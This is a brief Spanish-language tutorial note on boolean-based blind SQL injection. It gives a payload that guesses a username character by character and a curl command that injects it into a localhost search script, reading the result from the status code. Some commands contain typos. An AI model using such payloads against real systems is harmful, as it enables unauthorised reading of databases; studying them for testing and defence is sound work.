 Este tipo de inyección SQL utiliza consultas con **expresiones booleanas** para obtener información adicional. Por ejemplo, se puede utilizar una consulta con una expresión booleana para determinar si un usuario existe en una base de datos.
 El trabajo del desarrollador pudo haber impedido que se manipulen los link con el uso de comilla, pero es que no siempre son necesatias las comillas, con el uso de los numeros en valor hexageximal me los van a leer igual
```
select(select ascii(susbstring(username,1,1)) from users where id = 1)=97
```
Obtenemos información del código de estado de la siguiente manera
```
curl -s -I -X GET "http://localhost/searchUsears.php" -G --dataurlencode "id=9 or (select(select ascii(susbstring(username,1,1)) from users where id = 1)=97)"
```
